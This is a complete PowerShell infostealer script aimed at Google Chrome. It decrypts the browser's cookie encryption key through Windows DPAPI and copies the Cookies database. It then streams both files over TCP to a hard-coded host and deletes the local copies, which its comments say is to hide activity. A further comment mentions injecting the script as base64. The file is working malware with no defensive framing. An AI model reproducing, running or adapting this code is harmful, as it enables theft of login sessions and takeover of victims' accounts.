Add-Type -AssemblyName System.Security



# GET KEY
function GetEncryptionKey {
  $localStatePath = Join-Path $env:USERPROFILE 'AppData\Local\Google\Chrome\User Data\Local State'
  $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json

  # decode the encryption key from Base64
  $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
  # remove 'DPAPI' str
  $key = $key[5..($key.Length - 1)]
  # return decrypted key that was originally encrypted
  # using a session key derived from current user's logon credentials
  $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($key,$null,'CurrentUser')

  # write the decrypted key to a file in the current directory
  $filePath = Join-Path $env:TEMP 'encryption_key.bin' #Join-Path $PSScriptRoot 'encryption_key.bin' (changed this because path doesnt work when injecting as base64)
  [System.IO.File]::WriteAllBytes($filePath,$decryptedKey)

  return $decryptedKey
 
}




# GET COOKIES
function GetCookies {
  # local sqlite Chrome cookie database path
  $dbPath = Join-Path $env:USERPROFILE 'AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'

  # copy the file to current directory
  # as the database will be locked if chrome is currently open
  $filename = 'Cookies.db'
  if (-not (Test-Path $filename)) {
    # copy file when does not exist in the current directory
    Copy-Item $dbPath $filename
  }
}





# SEND FILES OVER NETWORK

function SendCookies {
  $ipAddress = '192.168.1.194'
  $port = 80
  $CookieFile = Join-Path (Get-Location) 'Cookies.db'
  $KeyFile = Join-Path $env:TEMP 'encryption_key.bin'

  # send the cookies file and key file as a single payload
  $client = New-Object System.Net.Sockets.TcpClient ($ipAddress,$port)
  $stream = $client.GetStream()

  # Send cookies file
  $cookies = [System.IO.File]::ReadAllBytes($CookieFile)
  $cookiesSize = $cookies.Length
  $cookiesSizeBytes = [BitConverter]::GetBytes($cookiesSize)
  $stream.Write($cookiesSizeBytes, 0, $cookiesSizeBytes.Length)
  $stream.Write($cookies, 0, $cookies.Length)

  # Send key file
  $key = [System.IO.File]::ReadAllBytes($KeyFile)
  $keySize = $key.Length
  $keySizeBytes = [BitConverter]::GetBytes($keySize)
  $stream.Write($keySizeBytes, 0, $keySizeBytes.Length)
  $stream.Write($key, 0, $key.Length)

  $client.Close()

  # added delay so the files are not
  # deleted before sent
  Start-Sleep -s 1
  # remove files from local dir
  # after sending to hode activity
  Remove-Item $CookieFile
  Remove-Item $KeyFile
}



GetEncryptionKey

GetCookies

SendCookies





